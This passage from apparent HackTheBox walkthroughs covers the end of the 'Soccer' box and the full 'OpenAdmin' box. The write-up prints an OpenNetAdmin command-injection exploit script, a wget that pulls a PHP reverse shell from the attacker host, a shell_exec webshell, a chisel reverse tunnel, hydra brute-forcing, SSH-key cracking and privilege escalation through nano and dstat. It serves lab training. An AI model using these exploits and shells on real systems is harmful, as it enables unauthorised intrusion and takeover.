mkdir -p ~/.dstat echo &#39;import os; os.execv(&#34;/bin/sh&#34;, [&#34;sh&#34;])&#39; &gt; ~/.dstat/dstat_myplugin.py doas /usr/bin/dstat --myplugin And&hellip; I truly have no idea why that didn&rsquo;t work. Even when changing permissions, or stringing all the commands together into one line (to avoid the possibility of the filesystem cleanup that runs every couple of minutes), I kept getting the same infuriating error message:
dstat: option --myplugin not recognized, try dstat -h for a list of all the options WHAT THE HECK?! It&rsquo;s right there!! dstat even admits to it! According to the dstat man pages, the plugin can be in any of the following:
~/.dstat/ (path of binary)/plugins/ /usr/share/dstat/ /usr/local/share/dstat/ When I enter dstat --list, this is what I get:
I don&rsquo;t know what to say. It seems wrong. It lies.
Setting aside my rage, I tried the exact same thing, but using /usr/local/share/dstat/dstat_myplugin.py instead. It worked fine.
🎉 Hooray, a root shell!
Now just simply cat out the flag to finish the box.
LESSONS LEARNED Attacker I accidentally wasted a lot of time on subdomain enumeration. My scans kept returning random subdomains, which would enqueue another sub-subdomain, which would enqueue a sub-sub-subdomain&hellip; etc.
Keep an eye on your scanning tools, and if something seems wrong, don&rsquo;t be afraid to revise your usual methods. RTFM. Developers can be a little overstretched, and it&rsquo;s natural for people to cut a few corners. When this happens while critical software is being installed/configured, they may forget to disable default credentials. The documentation for open source software can sometimes reveal these credentials. In HTB, cracking hashes is almost never the way. If you are trying to crack a hash, and can&rsquo;t do the job with just rockyou, then you&rsquo;re probably on the wrong track. When you reach new milestones in your entry into a system (foothold -&gt; user flag, user -&gt; privesc), remember to review your notes. In this box, when I got a shell as player, I already knew the trick that I was going to use for privilege escalation (doas + dstat). Defender As a developer, you must clean up after yourself. I&rsquo;m not sure if http://soc-player.soccer.htb/ was under development and http://soccer.htb/ was in production, but there is no reason to have both running concurrently. Security by obscurity is never the answer. Having a subdomain like http://soc-player.soccer.htb/ slows down an attacker, but any attacker with good enumeration skills will easily find this type of thing. Never store passwords in plaintext. Does this even need explanation? Better yet, try externalizing the risk by using some kind of SSO service. Avoid granting unnecessary permissions. There is no reason that player needed to be able to dstat as root. `,url:"https://4wayhandshake.github.io/walkthrough/soccer/"},"https://4wayhandshake.github.io/walkthrough/openadmin/":{title:"OpenAdmin",tags:["RCE","Default Credentials","Websockets"],categories:["Walkthrough","HTB","Linux","Easy"],content:`INTRODUCTION At first, the target seems like a half-built Apache server. After a little enumeration, it seems like a single server hosting four website templates: one for music, one for interior design, one for artwork, and one that is generally-applicable.
It&rsquo;s funny, but some of these seem like really nice templates.
The real action, as the name of the box suggests, is at the admin panel that manages the templates. It&rsquo;s a site for typical web hosting tasks like managing hosts, editing DNS, adding users, etc.
Warning: This walkthrough contains many spoilers. No spoilers will be unexpected if you read the walkthrough sequentially.
RECON I followed my typical first steps. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to my target machine&rsquo;s IP, and scanned it with my typical nmap &ldquo;init&rdquo; scan:
nmap -sV -sC -O -n -Pn -oA nmap/init-scan $RADDR My &ldquo;init&rdquo; nmap scan: explained This is a quick yet highly useful scan of the lower 1000 ports. I always use this first.
-sV Version detection. Ex. if port 21 is open, attempt to guess what version of FTP is running. -sC Default script scan; shorthand for --script=default -O Enable OS detection. Nmap makes its best guess to fingerprint the target. -n Disable DNS resolution: we don&rsquo;t need hostnames. Speeds up the scan greatly. -Pn Skip host discovery, which is unnecessary if we&rsquo;re targeting just one host. -oA Output results in all formats, to the nmap/init-scan directory.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 23:55 IDT Nmap scan report for 10.10.10.171 Host is up (0.17s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b98df85d17ef03dda48cdbc9200b754 (RSA) | 256 dceb3dc944d118b122b4cfdebd6c7a54 (ECDSA) |_ 256 dcadca3c11315b6fe6a489347c9be550 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=6/6%OT=22%CT=1%CU=42882%PV=Y%DS=2%DC=I%G=Y%TM=647F9D6C OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=106%TI=Z%CI=Z%TS=A)SEQ(SP=10 OS:6%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3 OS:=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=7120%W2=7 OS:120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M53CNNSNW OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O= OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W= OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) nmap scan revealed only SSH on port 22 and a webserver on port 80
Webserver Strategy Results of the strategy will be summarized at the end of the section.
Add the target to /etc/hosts.
echo &#34;10.10.10.171 bashed.htb&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
Download the source code &amp; extract all the links.
Omitted here because it was not helpful for this box. At a high level, this is the process I usually follow:
Use wget to download a copy of the target domain Use strings to extract all strings from the source code Use regex to parse all strings. I look for text following an href attribute and anything with http or https Perform vhost enumeration on the target.
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.10.10.68:80/ -H &#34;Host: FUZZ.bashed.htb&#34; -c -t 40 -o ./Bashed/fuzzing/vhost-bashed.htb.md -of md -timeout 4 -ic -ac -mc 200,204,301,307,401,403,405,500,404 Perform subdomain enumeration on the target.
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://FUZZ.bashed.htb -c -t 40 -o ./Bashed/fuzzing/subdomain-bashed.htb.md -of md -timeout 4 -ic -ac Perform directory enumeration on the target domain and any domains collected in steps (3) or (4).
feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://bashed.htb -A -d 1 -t 100 -T 4 --burp --smart -o ./Bashed/fuzzing/directory-bashed.htb.json For vhost and subdomain enumeration, ANY RESULTS may be important. For directory enumeration, there are many false-positives. READ THROUGH THE RESULTS MANUALLY and look for important results. I sometimes run this twice, filtering out the byte size for unimportant pages. Check each page for a form with a POST method, using the list of pages from directory enumeration. I use a handy tool called Selenium Oxide. Below is a snippet that shows how I do this:
exploit = ExploitBuilder(&#39;http&#39;, addr, use_proxy=args.proxy) with open(f&#39;./{dirname}/discovered_uris.txt&#39;, &#39;r&#39;) as f: for f_url in f: # Change subdomains if addr != f&#39;{baseurl(f_url)}:{port}&#39;: # then skip this result # [omitted] exploit.driver.maximize_window() exploit.get(f&#39;/{page(f_url)}&#39;) # Only examine sites that have a form that does a POST forms = exploit.driver.find_elements(By.CSS_SELECTOR, &#39;form[method=&#34;POST&#34;]&#39;) user = SeO2User() for frm in forms: print(f&#39;\\nExamining form: {frm.get_attribute(&#34;outerHTML&#34;)}\\n&#39;) inputs = frm.find_elements(By.CSS_SELECTOR, &#39;input&#39;) # [omitted] Note that this check could also be performed using regex, but regex parsing of HTML is really difficult and error-prone in my experience.
Do banner-grabbing on the target.
whatweb $RADDR &amp;&amp; curl -IL $RADDR Check Wappalyzer, a tool used for identifying the underlying technologies of a website. I use the official Wappalyzer plugin for firefox.
Notable results from enumeration of this box included the following:
(no vhosts) (no subdomains) http://openadmin.htb/music/ http://openadmin.htb/artwork/ http://openadmin.htb/sierra/ http://openadmin.htb/marga/ http://openadmin.htb/ona/ Apache 2.4.29, Ubuntu, PHP Exploring the website The server appears to host four websites, each on a different directory of the same domain: /music, /artwork, /sierra, and /marga. The server seems to have some kind of admin panel at /ona, shown below:
The update warning on the /ona site indicates it is running a tool called opennetadmin, which has a corresponding git repo here. The update warning also reveals that it is running version 18.1.1.
Can&rsquo;t do much on the /ona page. Directory enumeration revealed several pages including login.php and logout.php.
There is also a little login widget at the top-right of the page. I tried admin:admin and got in right away. After reading through the Installation Instructions shown on the git repo, these are the default credentials and are supposed to be changed after the first run.
Unfortunately, the admin user doesn&rsquo;t seem to actually have privileges to do anything unexpected. admin can&rsquo;t even add new hosts or users, as far as I can see. Thankfully though, clicking the User Info widget at the top-right of the page reveals some important info:
Current DB connection info Database Host	localhost Database Type	mysqli Database Name	ona_default Database User	ona_sys Database Context	DEFAULT Database Context Desc	Default data context Database Context Color	#D3DBFF OK cool, a database user. Also, we now know that it is using MySQL (which I would have assumed anyway, but it&rsquo;s good to know for sure.) That might be helpful later. The username especially.
After reading fully through the installation and configuration instructions on the git repo, it is clear that ona_sys will have UPDATE access to the database, but should already have a password defined.
Not seeing anything else particularly interesting on this page, it might be time to move on.
FOOTHOLD First Reverse Shell Perhaps there is an exploit for this version of opennetadmin?
searchsploit opennetadmin Oh nice! It looks like this version might be viulnerable. There is an exploit in msfconsole too, so let&rsquo;s try that next. First, set a new firewall rule allowing a reverse shell from the target machine to the attacker machine:
sudo ufw allow from 10.10.10.171 to any port 4444 proto tcp Next, open up msfconsole and search for the exploit:
msfconsole search opennetadmin use 0 show info set RHOSTS 10.10.10.171 set LHOST tun0 check run Unfortunately, even though the exploit passed the check, a reverse shell did not connect.
However, there was still one other really juicy-looking exploit that was listed on searchsploit. Let&rsquo;s check that out instead.
On my machine, the exploit is present at /usr/share/exploitdb/exploits/php/webapps/47691.sh . Reading though the script, it looks like the script only expects a single parameter, the target URL:
#!/bin/bash URL=&#34;\${1}&#34; while true;do echo -n &#34;$ &#34;; read cmd curl --silent -d &#34;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \\&#34;BEGIN\\&#34;;\${cmd};echo \\&#34;END\\&#34;&amp;xajaxargs[]=ping&#34; &#34;\${URL}&#34; | sed -n -e &#39;/BEGIN/,/END/ p&#39; | tail -n +2 | head -n -1 done Ok, let&rsquo;s try it out against the target /ona:
👎 Nope, that didn&rsquo;t work
👍 YUP that worked! Wonderful!
This exploit provides a non-interactive shell at /opt/ona/www/ (which itself is symlinked from the Apache directory /var/www/ona)
But what else is present in this directory?
$ ls -la total 88 drwxrwxr-x 10 www-data www-data 4096 Jun 6 20:18 . drwxr-x--- 7 www-data www-data 4096 Nov 21 2019 .. -rw-rw-r-- 1 www-data www-data 1970 Jan 3 2018 .htaccess.example drwxrwxr-x 2 www-data www-data 4096 Jan 3 2018 config -rw-rw-r-- 1 www-data www-data 1949 Jan 3 2018 config_dnld.php -rw-rw-r-- 1 www-data www-data 4160 Jan 3 2018 dcm.php drwxrwxr-x 3 www-data www-data 4096 Jan 3 2018 images drwxrwxr-x 9 www-data www-data 4096 Jan 3 2018 include -rw-rw-r-- 1 www-data www-data 1999 Jan 3 2018 index.php drwxrwxr-x 5 www-data www-data 4096 Jan 3 2018 local -rw-rw-r-- 1 www-data www-data 4526 Jan 3 2018 login.php -rw-rw-r-- 1 www-data www-data 1106 Jan 3 2018 logout.php drwxrwxr-x 3 www-data www-data 4096 Jan 3 2018 modules drwxrwxr-x 3 www-data www-data 4096 Jan 3 2018 plugins drwxrwxr-x 2 www-data www-data 4096 Jan 3 2018 winc drwxrwxr-x 3 www-data www-data 4096 Jan 3 2018 workspace_plugins Haha alright, so it&rsquo;s the whole /ona site and related PHP. Since there are PHP scripts right in this directory, it stands to reason that other php could be ran from this same directory 🤔 This non-interactive shell is kind of a pain, so perhaps I could add a new reverse shell?
I grabbed a copy of my toolbox, and added an easy PHP reverse shell to it. The reverse shell I got was one that came with kali: /usr/share/webshells/php/php-reverse-shell.php. I&rsquo;m sure many reverse shells would have worked, but this is one I&rsquo;ve tried before so I&rsquo;ll use it first. I hosted my toolbox, including a copy of this reverse shell, from my attacker machine. First, I set a new firewall rule:
sudo ufw allow from 10.10.10.171 to any port 8000 proto tcp Then I stood up the python webserver:
python3 -m http.server 8000 And in a separate terminal tab, opened a netcat listener for the reverse shell
nc -lvnp 4444 Then, from the target box&rsquo;s non-interactive shell created by the exploit 47691.sh, I downloaded the reverse shell directly into /opt/ona/www:
wget 10.10.14.10:8000/php-reverse-shell.php Using a web browser, I made a request to the reverse shell. Immediately, I got a shell:
Upgrading the Shell I originally learned this procedure from this blog post. It goes into much more depth, but I find that the following is usually sufficient. In only a few rare cases have I had to do more than this.
Starting with the &ldquo;dumb&rdquo; shell, change from sh to bash:
SHELL=/bin/bash script -q /dev/null You&rsquo;ll have a better prompt now, but still no tab completion and still no ability to use things like less or vi. Let&rsquo;s fix that:
[ctrl+z] stty raw -echo fg [enter] [enter] export TERM=xterm256-color The shell will be backgrounded, then enable echo mode with stty, then brought back to the foreground. This should make the shell much more comfortable to use. Enjoy your tab-completion and colours 🌈.
www-data So what can www-data do? Whenever I gain foothold on a new box, I like to take the following steps:
Linux foothold strategy Run id. Find out what groups this user is in. Locate the user within /etc/passwd if possible; see if they have a shell and/or home directory.
id &amp;&amp; cat /etc/passwd | grep $USER Check if the user can sudo
sudo -l Check locations that are writable by the user or its group
find / -user [username] 2&gt;/dev/null find / -group [groupname] 2&gt;/dev/null Does the user already have any useful tools?
which nc netcat socat python perl php Check for any active and listening sockets
netstat -tulpn | grep LISTEN ☝️ also try netstat -antp
Does the user have anything in cron?
crontab -l Does the system or root have anything in cron?
cat /etc/crontab ls -laR /etc/cron* Find any SUID or SGID executables that are accessible by the user
find / -type f \\( -perm -4000 -o -perm -2000 \\) -exec ls -l {} \\; 2&gt;/dev/null | grep -v &#39;/proc&#39; Download the toolbox (not covered in-depth here).
My toolbox includes linpeas, linenum, pspy, and chisel.
Since HTB boxes are not connected to the internet, I usually get my tools onto the target box by standing up a python webserver and using any available tool (nc, wget, or curl) to download the tools from my attacker machine onto the target box. I also use this webserver for moving exploit code from my attacker box onto the target.
I&rsquo;ve prepared a small toolbox for myself, including a short index.html page, that is generally applicable for any CTF box. I suggest any reader of this walkthough does the same.
Run pspy and take a look at any running processes. Since pspy is closed with ctrl+c, and your reverse shell may not be fully interactive, it is best to run this on a timeout:
timeout 5m ./pspy Run pre-scripted enumeration tools, such as LinEnum or linpeas
./LinEnum.sh ./linpeas.sh -w I only did steps (1) through (5) and saved the rest for later. Notable results from the foothold strategy included the following:
(1) revealed that there are three important users on the box: www-data, joanna, and jimmy. (3) revealed that www-data can write to any of the typical apache directories (4) revealed that nc, netcat, wget, curl, perl, and php are all present. (5) revealed that SSH, DNS, MySQL, and something on port 52846 were all running. MySQL Now that I&rsquo;m on the box, it makes sense to look into usage of MySQL. After all, we already know at least one valid user: ona_sys (shown from the User Info widget on the /ona admin page). There is probably also the root user. Unfortunately, we don&rsquo;t know the password for either user.
Tried several guesses at credentials:
root : root root : toor admin : admin ona_sys : ona_sys And several others&hellip; No dice 🎲 None of those were correct. Let&rsquo;s take a look around for suspicious config files. After all, if the /ona admin page was left with default credentials admin : admin, there is a good chance that the database credentials were left in some config file.
www-data@openadmin:/opt/ona/$ ls /opt/ona/sql www-data@openadmin:/opt/ona/sql$ cat list_all_hosts.sql www-data@openadmin:/opt/ona/www/config$ cat config.inc.php www-data@openadmin:/opt/ona/www/local/config$ cat database_settings.inc.php Beautiful! database_settings.inc.php has some useful info inside:
&lt;?php $ona_contexts=array ( &#39;DEFAULT&#39; =&gt; array ( &#39;databases&#39; =&gt; array ( 0 =&gt; array ( &#39;db_type&#39; =&gt; &#39;mysqli&#39;, &#39;db_host&#39; =&gt; &#39;localhost&#39;, &#39;db_login&#39; =&gt; &#39;ona_sys&#39;, &#39;db_passwd&#39; =&gt; &#39;n1nj4W4rri0R!&#39;, &#39;db_database&#39; =&gt; &#39;ona_default&#39;, &#39;db_debug&#39; =&gt; false, ), ), &#39;description&#39; =&gt; &#39;Default data context&#39;, &#39;context_color&#39; =&gt; &#39;#D3DBFF&#39;, ), ); So the MySQL credential is ona_sys : n1nj4W4rri0R!
Let&rsquo;s try logging into MySQL with that credential:
Success! We&rsquo;re in the database 😁
Then, issue the following commands into MySQL to poke around the database a bit:
use ona_default; show tables; select * from users; The users table shows some passwords:
However, since we know the admin credential is simply admin : admin, we know that these passwords must be hashed&hellip; Thankfully there is no salt, but what hashing algorithm was used?
Worst case scenario, I try all the common algorithms and see which one hashes &ldquo;admin&rdquo; into &ldquo;21232f297a57a5a743894a0e4a801fc3&rdquo;
Instead of writing my own script to do this, I figured there was probably an online tool to do it. I searched for &ldquo;reverse hashing online&rdquo; and chose the top result: https://md5hashing.net. I entered in the hash to search, chose &ldquo;Search all types&rdquo;, and hit Decode:
About ten seconds later, it spat out a table showing that this hash corresponds to &ldquo;admin&rdquo; (the expected value) when hashed using MD5. Perfect! My guess was correct &#x1f913;
Let&rsquo;s run the hash for the guest user through the same decoder, this time specifying MD5:
Apparently, this is the MD5 hash of the text &ldquo;test&rdquo;. Good to know.
Let&rsquo;s see if we can do anything odd using MySQL. Sometimes it&rsquo;s possible to leak file contents just through the database. It all depends on privileges:
mysql&gt; select * from GLOBAL_VARIABLES; ERROR 3167 (HY000): The &#39;INFORMATION_SCHEMA.GLOBAL_VARIABLES&#39; feature is disabled; see the documentation for &#39;show_compatibility_56&#39; mysql&gt; select * from USER_PRIVILEGES; +-----------------------+---------------+----------------+--------------+ | GRANTEE | TABLE_CATALOG | PRIVILEGE_TYPE | IS_GRANTABLE | +-----------------------+---------------+----------------+--------------+ | &#39;ona_sys&#39;@&#39;localhost&#39; | def | USAGE | NO | +-----------------------+---------------+----------------+--------------+ 1 row in set (0.00 sec) mysql&gt; select LOAD_FILE(&#34;/root/root.txt&#34;); +-----------------------------+ | LOAD_FILE(&#34;/root/root.txt&#34;) | +-----------------------------+ | NULL | +-----------------------------+ 1 row in set (0.00 sec) mysql&gt; select LOAD_FILE(&#34;/home/joanna/user.txt&#34;); +------------------------------------+ | LOAD_FILE(&#34;/home/joanna/user.txt&#34;) | +------------------------------------+ | NULL | +------------------------------------+ 1 row in set (0.00 sec) mysql&gt; select LOAD_FILE(&#34;/home/jimmy/user.txt&#34;); +-----------------------------------+ | LOAD_FILE(&#34;/home/jimmy/user.txt&#34;) | +-----------------------------------+ | NULL | +-----------------------------------+ 1 row in set (0.00 sec) 😑 Unfortunately, it looks like the database is protected against file shenanigans.
After checking several other tables in the database ona_default, it seems like the only benefit may have been obtaining those password hashes. Other tables were default or empty. I&rsquo;ll keep the database access in-mind, but for now I&rsquo;ll move on.
The permission, permission_assignments, and users tables collectively describe what permissions each user has. For what it&rsquo;s worth, it seems that the admin user has all permissions, and the guest user has none.
www-data (continued) Now that I&rsquo;ve investigated MySQL, I&rsquo;ll go back and enumerate the www-data user properly. Prior to this, I had only done steps (1) to (5) of my [Linux Foothold Strategy](#Linux foothold strategy).
Checking the listening
netstat -tulpn | grep LISTEN Listening processes check: explained This checks for any processes with a socket open in a listening state
-t Show processes using TCP -u Show processes using UDP -l Show sockets in the listening state only -p Show the PID of the each process -n Use numeric addresses instead of attempting name resolution
This check revealed a possibly interesting result:
Address Service 127.0.0.1:3306 MySQL 127.0.0.1:52846 UNKNOWN 127.0.0.53:53 DNS tcp 0.0.0.0:22 SSH :::80 HTTP server :::22 SSH 127.0.0.53:53 DNS udp Mysterious Port 52846 Doing a quick Google search on tcp port 52846 revealed nothing. I&rsquo;ll try connecting to it manually to see if it lets us know its identity:
Huh ok. So it&rsquo;s using HTTP, and it responded from internal.openadmin.htb
I&rsquo;ll try using curl on that same port:
curl localhost:52846 The response was a login page (document head omitted for brevity):
&lt;body&gt; &lt;h2&gt;Enter Username and Password&lt;/h2&gt; &lt;div class = &#34;container form-signin&#34;&gt; &lt;h2 class=&#34;featurette-heading&#34;&gt;Login Restricted.&lt;span class=&#34;text-muted&#34;&gt;&lt;/span&gt;&lt;/h2&gt; &lt;/div&gt; &lt;!-- /container --&gt; &lt;div class = &#34;container&#34;&gt; &lt;form class = &#34;form-signin&#34; role = &#34;form&#34; action = &#34;/index.php&#34; method = &#34;post&#34;&gt; &lt;h4 class = &#34;form-signin-heading&#34;&gt;&lt;/h4&gt; &lt;input type = &#34;text&#34; class = &#34;form-control&#34; name = &#34;username&#34; required autofocus&gt;&lt;/br&gt; &lt;input type = &#34;password&#34; class = &#34;form-control&#34; name = &#34;password&#34; required&gt; &lt;button class = &#34;btn btn-lg btn-primary btn-block&#34; type = &#34;submit&#34; name = &#34;login&#34;&gt;Login&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt; Tunnel to internal I want to take a more thorough look at this login form, but this port is not exposed to the internet. No problem: I already have the perfect tool downloaded onto the target box: chisel. Chisel is used for forming tunnels.
This can get a little confusing, so I&rsquo;ll lay out what ports I will be using:
52846: port on the target box that I want to create a tunnel to 52847: port on the attacker box that chisel will use to build the tunnel 52848: port on the attacker box to connect to, if I want to reach 52846 on the target box.
On the attacker box, start up chisel server for a reverse tunnel:
./chisel server -p 52847 -reverse -v On the target box, start up chisel in client mode, mapping 52846 to 52848 and connecting back to the attacker box on port 52847.
./chisel client 10.10.14.10:52847 R:52848:127.0.0.1:52846 Back on the attacker box, try connecting to target&rsquo;s port 52846 by connecting to local port 52848:
curl localhost:52848 Uhh&hellip; it&rsquo;s not working?
This is what I&rsquo;m seeing from the process running chisel server:
Ah, I see the problem 😥 Got too excited about building the tunnel, and forgot to open my firewall
sudo ufw allow from 10.10.10.171 to any port 52847 proto tcp Try the tunnel again?
curl localhost:52848 💪 Success!
Login form at port 52846 That&rsquo;s great, but I could have used curl locally on the target box via my reverse shell. The point was that I wanted to see this rendered in a browser (and also be able to use it with Burp, etc.):
I checked for credential re-use, trying the following credentials:
admin : admin guest : test ona_sys : n1nj4W4rri0R! Other common credentials like: root : root root : toor guest : guest And some easy sql authentication bypasses: admin&rsquo; or &lsquo;1&rsquo;=&lsquo;1 : pass admin&rsquo;)&ndash; - : pass None of the above worked. Maybe worth taking a look at what code runs this page.
Interesting: I can&rsquo;t look at it as www-data. That directory is owned by jimmy&hellip; Since it&rsquo;s owned by jimmy, perhaps that is the username for the login? I&rsquo;ll try brute-forcing the login as jimmy, using hydra:
This is a bit desperate. Usually HTB does not require brute-forcing like this.
PASSWORDS=/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt hydra -l jimmy -P $PASSWORDS -s 52848 localhost http-post-form &#34;/index.php:username=^USER^&amp;password=^PASS^&amp;login=:F=Enter Username and Password&#34; Still nothing. OK&hellip; Time to regroup and review what I&rsquo;ve done so far 😓
💡 I realize now that, even though I found a credential, I forgot to try it everywhere.
I&rsquo;ve tried combinations of users admin / joanna / jimmy with passwords admin / test / n1nj4W4rri0R! on every login page that I&rsquo;ve encountered, and it ended up getting me into the MySQL database. But I&rsquo;m realizing that I forgot to try one service, maybe the most important one: SSH.
Trying those same three passwords (admin, test, n1nj4W4rri0R!) with the two confirmed users on the box (joanna, jimmy):
😁 NICE! Thank you, ninjawarrior ⚔️
Now that I&rsquo;m logged in as jimmy, I can read the directory /var/www/internal that I was locked out of as www-data. Let&rsquo;s see how that login form works:
My suspicion was correct: that form only accepts jimmy as a user. And the form requires all three fields: username, password, and login. Also, the source code of index.php reveals the hash of the password and the hashing algorithm for it:
sha512 00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1 Having had so much success with it before, I went straight to https://md5hashing.net to attempt to recover the password:
After a minute of calculation, I had a new credential: jimmy: Revealed
I immediately attempted to use this credential on the login form&hellip; and it worked! The result is a redirection to /main.php containing an RSA private key, and a reminder about a password:
I copied the text and pasted it into a new file id_rsa. Then changed permissions on it so it could be used for SSH:
chmod 700 id_rsa Then I tried using this key for SSH login, as both jimmy and joanna. Taking the hint from main.php, &ldquo;Don&rsquo;t forget your ninja password&rdquo;, I tried using this RSA key with passphrase &ldquo;n1nj4W4rri0R!&rdquo;, &ldquo;ninja&rdquo;, and a blank passphrase:
Unfortunately, none of these attempts were successful. If this key is for joanna, then the key must have been generated with a passphrase, and that passphrase is not &ldquo;n1nj4W4rri0R!&rdquo; 🤔
USER FLAG Jimmy I got so excited about getting access to jimmy, and being able to read the source code for that mysterious login form, that I forgot to explore what jimmy has access to. Unfortunately, /home/jimmy is nearly empty (no flag), and jimmy does not have access to /home/joanna (where the flag must reside, by process of elimination.)
Realizing this, I performed my [Linux foothold strategy](#Linux foothold strategy) once again, this time for jimmy. However, I didn&rsquo;t really find anything that I hadn&rsquo;t already obtained.
Getting back to what I was so excited about, I&rsquo;ll proceed with inspecting the source code for main.php. It&rsquo;s now clear who the RSA key is for:
But why does that php script work? Why can shell_exec() read a file owned by joanna? It must be that the process is spawned by joanna.
To test this, I copied main.php to an adjacent file, shell.php. I then removed pretty much everything but the shell_exec() and turned it into a little webshell:
&lt;?php $cmd = $_GET[&#39;cmd&#39;] ?? &#39;id&#39;; $res = shell_exec($cmd); echo &#34;&lt;p&gt; &gt;&gt; $cmd&lt;/p&gt;&lt;hr&gt;&lt;pre&gt;$res&lt;/pre&gt;&#34;; ?&gt; It will run id if given no parameters. Indeed, the script is being ran by joanna:
🎉 And thankfully, the browser performs url-encoding by itself, so no need to fuss about spaces:
Webshells are handy in a pinch, but can be a bit restrictive. Since this is all being executed as joanna, I&rsquo;ll start a new reverse shell so we can investigate joanna more thoroughly. First, as jimmy, download a copy of the good &lsquo;ol php-reverse-shell.php (that is still being served by my python webserver):
☝️ Remember to modify php-reverse-shell.php to use the new port, 5555.
As jimmy, set proper file ownership and permissions:
chown jimmy:internal php-reverse-shell.php chmod 755 php-reverse-shell.php Then, on the attacker box, set a new firewall rule and start a netcat listener:
sudo ufw allow from 10.10.10.171 to any port 5555 proto tcp bash nc -lvnp 5555 and in a separate tab on the attacker box, trip the reverse shell with a GET request to it (this request goes through the tunnel created with chisel):
curl http://localhost:52848/php-reverse-shell.php And there&rsquo;s the new shell!
Upgrade the reverse shell with the following:
SHELL=/bin/bash script -q /dev/null export TERM=xterm256-color [ctrl+z] stty raw -echo fg [enter] [enter] ROOT FLAG Joanna Now that we have a nice shell as Joanna, it makes sense to enumerate the user by following my typical [Linux foothold strategy.](#Linux foothold strategy) Since the procedure is the same as always, I&rsquo;ll spare the details and skip right to the key results/findings:
(1) showed that joanna is also a member of the internal group. (3) revealed joanna only has write access to /home/joanna and /var/www/internal. joanna has some sudo privileges (found by running linpeas as jimmy):
But from what I&rsquo;ve observed, joanna definitely cannot sudo anything. If joanna is in the sudoers file, why is sudo not allowed?
To be honest, I couldn&rsquo;t find anything written online that adequately explained what was going on. I only found the cause of this problem by reading through a bunch of notes of other people working on this box that encountered the same problem.
Short story: this discrepancy is because I&rsquo;m using a reverse shell for joanna instead of SSH.
Being provided with the hint that SSH is essential to overcome this issue in using sudo, I&rsquo;m going to take another look at the attempt to SSH into the box as joanna.
I wanted to see how the RSA private key I obtained compared to a test one I generated. Working from the hypothesis that I didn&rsquo;t know the passphrase for the RSA key, I generated two test rsa keys, one with a passphrase and one without:
ssh-keygen -t rsa -b 2048 [save file as ./id_rsa_test_nopass] [answer the prompts with no passphrase] ssh-keygen -t rsa -b 2048 [save file as ./id_rsa_test_pass] [answer the prompts with a passphrase] The difference between the two is immediately apparent:
The preamble at the beginning of id_rsa_test_pass is due to the addition of a passphrase! This confirms the suspicion that the RSA key was not working earlier because the key contained a passphrase.
So how to find the passphrase? Well, this format of encryption is notoriously easy to crack, so let&rsquo;s give it a go. First, convert the ssh key to a hash that is crackable with john:
ssh2john id_rsa &gt; id_rsa.john Then use john to crack the hash. Most hash-cracking on HTB seems intentionally a part of rockyou, so that&rsquo;s what I&rsquo;ll start with :
⚡ And just 6 seconds later, there&rsquo;s the passphrase!
Let&rsquo;s try the SSH key now, with the passphrase bloodninjas:
Wonderful! Not only that, but also the sudo -l that causing an error earlier has now been resolved:
Privilege Escalation The output of sudo -l indicates (as was exposed by linpeas earlier) that joanna can run sudo /bin/nano /opt/priv without entering a password. This will run nano with elevated permissions.
Just like other text editors, like vim, nano has a feature that allows a user to run shell commands without leaving the editor. See this GTFObins page for a description of several ways to do this. This makes nano a perfect privilege escalation vector.
I&rsquo;m following this method:
sudo /bin/nano /opt/priv [ctrl+R] [ctrl+X] reset; sh 1&gt;&amp;0 2&gt;&amp;0 A prompt appears providing a root shell:
While it would be easy to grab the flag from this shell itself, let&rsquo;s go the extra mile and obtain a reverse shell. First, on the attacker box, set a new firewall rule, change to bash, and establish a netcat listener:
Then, on the target box, inside the root shell within nano, form the reverse shell. It&rsquo;s clear this box already has php, so let&rsquo;s use that reverse shell:
🎉 On the attacker box, the reverse shell is caught!
Upgrade the shell using the same procedure as before:
SHELL=/bin/bash script -q /dev/null export TERM=xterm256-color [ctrl+z] stty raw -echo fg [enter] [enter] Then last but not least, cat out the root flag:
